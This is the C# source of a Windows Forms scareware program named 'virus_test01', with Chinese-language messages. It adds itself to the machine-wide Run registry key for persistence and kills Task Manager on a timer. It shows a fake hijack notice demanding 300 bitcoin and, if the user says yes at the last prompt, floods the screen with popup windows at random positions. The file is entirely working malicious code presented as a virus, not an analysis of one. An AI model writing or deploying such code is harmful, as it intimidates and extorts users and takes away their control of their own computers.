using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;

namespace virus_test01
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            start1();
            this.timer1.Start();//每隔一段时间杀死任务管理器
            DialogResult aa = MessageBox.Show("警告！你的电脑已经小苍被劫持了！！请回答以下一系列问题，如果选否，game over", "[ERROR]",
                                    MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (aa == DialogResult.Yes)
            {
                DialogResult aa1 = MessageBox.Show("叫你随便下载网上的资源，你说说你是不是贪小便宜？", "[ERROR]",
                                    MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                if (aa1 == DialogResult.Yes)
                {
                    DialogResult aa2 = MessageBox.Show("现在怕不怕了？想要恢复电脑吗！", "[ERROR]",
                                    MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                    if (aa2 == DialogResult.Yes)
                    {
                        DialogResult aa3 = MessageBox.Show("想要的话就在一小时内把300比特币转帐到银行帐号xx123456789！", "[ERROR]",
                                    MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                        if (aa3 == DialogResult.Yes)
                        {
                            DialogResult aa4 = MessageBox.Show("在你没转帐之前，程序会继续运行,一直到你的电脑资源崩溃，重启也没用，不信你可以试试！", "选择否可恢复！!",
                                    MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                            if (aa4 == DialogResult.No)
                            {
                                MessageBox.Show("哟豁！还真被你找到后门了！！行吧，放你走吧！");
                                timer2.Enabled = false;//关闭timer的开关
                                timer1.Enabled = false;
                                System.Environment.Exit(0);
                            }
                            else
                            {
                                this.timer2.Start();//开启timer的开关
                                timer2.Enabled = true;
                            }
                        }
                        else
                        {
                            MessageBox.Show("你居然选择了否？！好吧，这是你自找的，再见了，拜拜！"); start1();
                        }
                    }
                    else
                    {
                        MessageBox.Show("你居然选择了否？！好吧，这是你自找的，再见了，拜拜！"); start1();
                    }
                }
                else
                {
                    MessageBox.Show("你居然选择了否？！好吧，这是你自找的，再见了，拜拜！"); start1();
                }
            }
            else
            {
                MessageBox.Show("你居然选择了否？！好吧，这是你自找的，再见了，拜拜！"); start1();
            }
            
        }
        public void start1()
        {
            string str_ass_name = Application.StartupPath + @"\" + Application.ProductName + @".exe";//加载到注册表,让开机自动启动
            string short_file_name = Application.ProductName;
            RegistryKey auto_start = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (auto_start == null)
            {
                auto_start = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            }
            auto_start.SetValue(short_file_name, str_ass_name);
        }
        public void killprocess()//每隔一段时间杀死任务管理器,具体实现代码
        {
            Process[] tsk = Process.GetProcessesByName("taskmgr");
            foreach (Process i in tsk)
            {
                try
                {
                    i.Kill();
                }
                catch { }
            }
        }

        private void timer1_Tick(object sender, EventArgs e)//调用杀死任务管理器
        {
            killprocess();
        }
        private void timer2_Tick(object sender, EventArgs e)//随机屏幕每隔一段时间跳出警告弹窗
        {
            this.Hide();
            Random ran = new Random();
            int line = ran.Next(1, 1920);
            int list = ran.Next(1, 1080);
            Form2 wd = new Form2();
            wd.Left = line;
            wd.Top = list;
            wd.Show();
        }
    }
}